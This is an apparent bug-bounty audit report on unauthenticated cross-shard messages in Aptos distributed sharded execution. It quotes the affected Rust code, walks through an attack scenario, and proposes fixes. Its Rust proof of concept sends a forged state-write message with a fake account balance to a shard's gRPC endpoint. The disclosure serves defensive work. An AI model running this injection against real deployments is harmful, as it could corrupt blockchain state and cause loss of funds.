# Audit Report

## Title
Missing Sender Authentication in Cross-Shard Messaging Enables State Corruption and Consensus Break

## Summary
The `receive_cross_shard_msg()` function in the remote cross-shard client accepts messages from any network peer without validating the sender's identity. An attacker can impersonate legitimate shards to inject malicious state values, causing consensus breaks and potential fund theft in distributed sharded execution environments.

## Finding Description

The vulnerability exists in the cross-shard message handling flow for distributed execution:

1. **No Sender Validation in Message Receipt**: The `receive_cross_shard_msg()` function receives messages from a network channel without any authentication. [1](#0-0) 

2. **Sender Information Discarded at Network Layer**: When the gRPC service receives messages, it extracts the remote address but never validates it against expected shard addresses, and this sender information is not forwarded with the message. [2](#0-1) 

3. **Message Structure Contains No Sender Identity**: The `CrossShardMsg` structure contains only state keys and write operations, with no field for sender shard identity or authentication token. [3](#0-2) 

4. **Unauthenticated State Writes Applied Directly**: Received messages are immediately processed by `CrossShardCommitReceiver`, which extracts state updates and applies them directly to the cross-shard state view without verification. [4](#0-3) 

5. **Malicious Values Used in Transaction Execution**: The corrupted state values are then returned to transaction execution when state keys are read, affecting consensus-critical computation. [5](#0-4) 

**Attack Scenario:**
1. A distributed Aptos deployment runs with 3 shards at known network addresses
2. Shard 2 is executing a transaction that depends on state from Shard 1
3. An attacker at an arbitrary network address connects to Shard 2's gRPC endpoint
4. The attacker sends a `RemoteTxnWriteMsg` with a malicious state value for the key that Shard 2 is waiting for
5. Shard 2 accepts the message without verifying it came from Shard 1's expected address
6. The malicious state value is applied and used in transaction execution
7. Shard 2 produces a different state root than other shards, breaking consensus

This breaks the **Deterministic Execution** invariant (all validators must produce identical state roots) and the **Consensus Safety** invariant.

## Impact Explanation

**Critical Severity** - This vulnerability qualifies for the highest severity tier under the Aptos Bug Bounty program for the following reasons:

1. **Consensus/Safety Violation**: Different shards processing the same block will produce different state roots when one receives malicious cross-shard messages. This violates the fundamental consensus safety guarantee.

2. **Loss of Funds**: An attacker can manipulate account balances or token ownership by injecting false state values (e.g., claiming an account has 1,000,000 tokens when it has 100).

3. **State Corruption**: The blockchain state becomes permanently corrupted, potentially requiring a hard fork to recover.

4. **No Recovery Path**: Once malicious state values are committed to blocks, standard consensus mechanisms cannot detect or reject them since each shard believes it received legitimate data from peer shards.

The vulnerability affects any Aptos deployment using distributed sharded execution across multiple physical machines.

## Likelihood Explanation

**HIGH Likelihood** - This vulnerability is highly likely to be exploited:

1. **No Special Access Required**: Any network peer that can reach a shard's gRPC endpoint can exploit this - no validator privileges, staking, or insider access needed.

2. **Simple Attack Vector**: The attacker only needs to:
   - Know the network address of a target shard (often predictable or discoverable)
   - Craft a valid `CrossShardMsg` structure (simple BCS-serialized data)
   - Send a gRPC request

3. **Deterministic Success**: The attack succeeds 100% of the time since there is zero authentication - no probabilistic bypasses or race conditions.

4. **No Cryptographic Barriers**: No signatures, MACs, or other cryptographic protections exist in the message path.

5. **Production Relevance**: Distributed sharded execution is a key scaling feature for Aptos, making this attack surface highly relevant.

## Recommendation

Implement sender authentication for cross-shard messages using one of these approaches:

**Option 1: Socket Address Validation (Immediate Fix)**
```rust
// In GRPCNetworkMessageServiceServerWrapper::simple_msg_exchange
async fn simple_msg_exchange(
    &self,
    request: Request<NetworkMessage>,
) -> Result<Response<Empty>, Status> {
    let remote_addr = request.remote_addr()
        .ok_or_else(|| Status::unauthenticated("No remote address"))?;
    
    let network_message = request.into_inner();
    let message_type = MessageType::new(network_message.message_type.clone());
    
    // NEW: Validate sender address against expected shard addresses
    if !self.validate_sender_address(remote_addr, &message_type) {
        return Err(Status::permission_denied(
            format!("Unauthorized sender: {:?}", remote_addr)
        ));
    }
    
    let msg = Message::new(network_message.message);
    // ... rest of handling
}
```

**Option 2: Cryptographic Authentication (Stronger)**
- Add a `sender_shard_id` field and BLS signature to `CrossShardMsg`
- Each shard signs messages with its private key
- Recipients verify signatures using the sender's public key from a trusted configuration

**Option 3: Mutual TLS**
- Configure TLS with client certificate authentication
- Each shard presents a certificate during connection
- Only accept connections from shards with valid certificates

The immediate fix should be Option 1 (address validation) with a roadmap to implement Option 2 for cryptographic guarantees.

## Proof of Concept

```rust
// PoC demonstrating the vulnerability
use aptos_secure_net::network_controller::Message;
use aptos_vm::sharded_block_executor::messages::{CrossShardMsg, RemoteTxnWrite};
use aptos_types::{
    state_store::state_key::StateKey,
    write_set::WriteOp,
};
use aptos_protos::remote_executor::v1::{
    network_message_service_client::NetworkMessageServiceClient,
    NetworkMessage,
};
use std::net::SocketAddr;

#[tokio::main]
async fn main() {
    // Target shard expecting legitimate messages from shard 1
    let target_shard_addr = "10.0.0.3:8080"; // Shard 2
    
    // Attacker creates malicious state update
    let malicious_state_key = StateKey::raw(b"account_balance_0x123");
    let malicious_write_op = WriteOp::Modification(vec![1, 0, 0, 0]); // fake balance
    
    let malicious_msg = CrossShardMsg::RemoteTxnWriteMsg(
        RemoteTxnWrite::new(malicious_state_key, Some(malicious_write_op))
    );
    
    // Serialize message
    let message_bytes = bcs::to_bytes(&malicious_msg).unwrap();
    
    // Connect from attacker's address (not the expected shard 1 address)
    let mut client = NetworkMessageServiceClient::connect(
        format!("http://{}", target_shard_addr)
    ).await.unwrap();
    
    // Send message - will be accepted without authentication!
    let request = tonic::Request::new(NetworkMessage {
        message: message_bytes,
        message_type: "cross_shard_0".to_string(), // Round 0
    });
    
    match client.simple_msg_exchange(request).await {
        Ok(_) => println!("Attack successful! Malicious state injected."),
        Err(e) => println!("Attack failed: {}", e),
    }
}
```

**Test Execution Steps:**
1. Set up a 3-shard distributed Aptos execution environment
2. Run the PoC from an unauthorized network address
3. Observe that the malicious message is accepted by the target shard
4. Verify that the cross-shard state view contains the malicious value
5. Confirm that transaction execution uses the corrupted state

**Notes**

The vulnerability specifically affects remote/distributed sharded execution deployments. Local multi-threaded execution using `LocalCrossShardClient` is not vulnerable since it uses in-process channels. However, any production deployment using network-based sharding for horizontal scaling is at critical risk. The lack of network-level security (no TLS, no authentication) in the `aptos-secure-net` module compounds this issue, making the attack trivial to execute.

### Citations

**File:** execution/executor-service/src/remote_cross_shard_client.rs (L61-66)
```rust
    fn receive_cross_shard_msg(&self, current_round: RoundId) -> CrossShardMsg {
        let rx = self.message_rxs[current_round].lock().unwrap();
        let message = rx.recv().unwrap();
        let msg: CrossShardMsg = bcs::from_bytes(&message.to_bytes()).unwrap();
        msg
    }
```

**File:** secure/net/src/grpc_network_service/mod.rs (L93-115)
```rust
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
```

**File:** aptos-move/aptos-vm/src/sharded_block_executor/messages.rs (L7-18)
```rust
#[derive(Clone, Debug, Deserialize, Serialize)]
pub enum CrossShardMsg {
    RemoteTxnWriteMsg(RemoteTxnWrite),
    StopMsg,
}

#[derive(Clone, Debug, Deserialize, Serialize)]
pub struct RemoteTxnWrite {
    state_key: StateKey,
    // The write op is None if the transaction is aborted.
    write_op: Option<WriteOp>,
}
```

**File:** aptos-move/aptos-vm/src/sharded_block_executor/cross_shard_client.rs (L26-45)
```rust
    pub fn start<S: StateView + Sync + Send>(
        cross_shard_state_view: Arc<CrossShardStateView<S>>,
        cross_shard_client: Arc<dyn CrossShardClient>,
        round: RoundId,
    ) {
        loop {
            let msg = cross_shard_client.receive_cross_shard_msg(round);
            match msg {
                RemoteTxnWriteMsg(txn_commit_msg) => {
                    let (state_key, write_op) = txn_commit_msg.take();
                    cross_shard_state_view
                        .set_value(&state_key, write_op.and_then(|w| w.as_state_value()));
                },
                CrossShardMsg::StopMsg => {
                    trace!("Cross shard commit receiver stopped for round {}", round);
                    break;
                },
            }
        }
    }
```

**File:** aptos-move/aptos-vm/src/sharded_block_executor/cross_shard_state_view.rs (L74-82)
```rust
impl<S: StateView + Sync + Send> TStateView for CrossShardStateView<'_, S> {
    type Key = StateKey;

    fn get_state_value(&self, state_key: &StateKey) -> Result<Option<StateValue>, StateViewError> {
        if let Some(value) = self.cross_shard_data.get(state_key) {
            return Ok(value.get_value());
        }
        self.base_view.get_state_value(state_key)
    }
```
